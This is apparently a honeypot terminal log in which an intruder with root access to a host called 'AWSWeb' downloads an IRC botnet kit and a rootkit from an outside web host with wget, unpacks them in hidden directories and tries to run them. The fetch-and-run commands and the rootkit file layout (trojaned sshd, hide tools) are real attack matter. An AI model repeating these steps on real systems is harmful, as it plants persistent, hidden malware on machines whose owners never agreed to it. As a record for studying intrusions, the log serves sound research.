@@ -1,0 +1,182 @@
+[4hAWSWeb:~# w
+[4l 15:28:05 up 56 days, 17:31,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    77.210.196.252    15:27    0.09   0.05   0.05 w
+[4hAWSWeb:~# service sendmail stop
+bash: service: command not found
+AWSWeb:~# ls -as
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# wget rapk1d.webs.com/flod.tg[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pood.tgz
+[4l--2013-03-22 15:28:54--  http://rapk1d.webs.com/flood.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 374651 (365K) [application/octet-stream]
+Saving to: `flood.tgz
+
+ 0% [>                                      ] 2,508        25K/s  eta 14s100%[======================================>] 374,651      25K/s
+
+2013-03-22 15:28:54 (25 KB/s) - `flood.tgz' saved [374651/374651]
+[4hAWSWeb:/tmp# tar xzvf flood.tgz
+[4l.icons
+.icons/cyc.levels
+.icons/r
+.icons/r/rnicks.e
+.icons/r/rsignoff.e
+.icons/r/rsay.e
+.icons/r/raway.e
+.icons/r/rinsult.e
+.icons/r/rversions.e
+.icons/r/rpickup.e
+.icons/r/rtsay.e
+.icons/r/rkicks.e
+.icons/run
+.icons/cyc.pid
+.icons/bin
+.icons/cyc.help
+.icons/go
+.icons/mech.dir
+.icons/cyc.acc
+.icons/stealth
+.icons/autorun
+.icons/m.help
+.icons/cyc.set
+.icons/pico
+.icons/cron.d
+.icons/update
+.icons/xhide
+.icons/randfiles
+.icons/randfiles/randsignoff.e
+.icons/randfiles/randkicks.e
+.icons/randfiles/randversions.e
+.icons/randfiles/randinsult.e
+.icons/randfiles/randsay.e
+.icons/randfiles/randaway.e
+.icons/randfiles/randpickup.e
+.icons/randfiles/randnicks.e
+[4hAWSWeb:/tmp# rm -rf flood.tgz
+[4l[4hAWSWeb:/tmp# cd .icons
+[4l[4hAWSWeb:/tmp/.icons# chmod +x *
+[4l[4hAWSWeb:/tmp/.icons# ./aut[1D[1Ptorun
+[4l[4hAWSWeb:/tmp/.icons# ./go
+[4lerror while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+[4hAWSWeb:/tmp/.icons# ./go
+[4lerror while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+[4hAWSWeb:/tmp/.icons# cd /usr
+[4l[4hAWSWeb:/usr# wget rapk1d.webs.com/key.pl
+[4l--2013-03-22 15:29:47--  http://rapk1d.webs.com/key.pl
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 682 (682bytes) [application/octet-stream]
+Saving to: `key.pl
+
+100% [=======================================>] 682          9K/s  eta 0s100%[======================================>] 682          9K/s
+
+2013-03-22 15:29:47 (9 KB/s) - `key.pl' saved [682/682]
+[4hAWSWeb:/usr# chmod +x key.pl
+[4l[4hAWSWeb:/usr# ./key.pl
+bash: ./key.pl: command not found
+AWSWeb:/usr# rm -rf key.pl
+[4l[4hAWSWeb:/usr# wget rapk1d.webs.com/rc.tgz
+[4l--2013-03-22 15:30:18--  http://rapk1d.webs.com/rc.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 711022 (694K) [application/octet-stream]
+Saving to: `rc.tgz
+
+ 0% [>                                      ] 1,128        8K/s  eta 1m 19s100%[======================================>] 711,022      8K/s
+
+2013-03-22 15:30:19 (8 KB/s) - `rc.tgz' saved [711022/711022]
+[4hAWSWeb:/usr# tar xzvf rc.tgz
+[4l.rc
+.rc/lib.tgz
+.rc/bin.tgz
+.rc/conf
+.rc/conf/log.h
+.rc/conf/lidps1.so
+.rc/conf/hosts.h
+.rc/conf/proc.h
+.rc/conf/file.h
+.rc/conf.tgz
+.rc/lib
+.rc/lib/libproc.so.2.0.6
+.rc/lib/libproc.a
+.rc/bin
+.rc/bin/.sh
+.rc/bin/.sh/sshd
+.rc/bin/.sh/.bashrc
+.rc/bin/.sh/shhk
+.rc/bin/.sh/shhk.pub
+.rc/bin/.sh/shdcf2
+.rc/bin/.sh/shrs
+.rc/bin/ifconfig
+.rc/bin/shp
+.rc/bin/hide
+.rc/bin/pico
+.rc/bin/shsb
+.rc/bin/sz
+.rc/bin/ttylib
+.rc/bin/a
+.rc/setup
+[4hAWSWeb:/usr# rm [1D[1P-rf[1D[1P[1D[1P[1D[1P -rf .[1D[1P[1D[1P rc.tgz
+[4l[4hAWSWeb:/usr# cd .rc
+[4l[4hAWSWeb:/usr/.rc# ./au[1D[1P[1D[1P[1D[1P[1D[1Pchmd +X *
+bash: chmd: command not found
+AWSWeb:/usr/.rc# ./[1D[1P[1D[1P[Kchmd +X *[1D[1D[1D[1D[1D[1Do
+[4l[4hAWSWeb:/usr/.rc# ./setup
+[4l  ___ 
+ {o,o}
+ |)__)
+ -"-"-
+O RLY? 
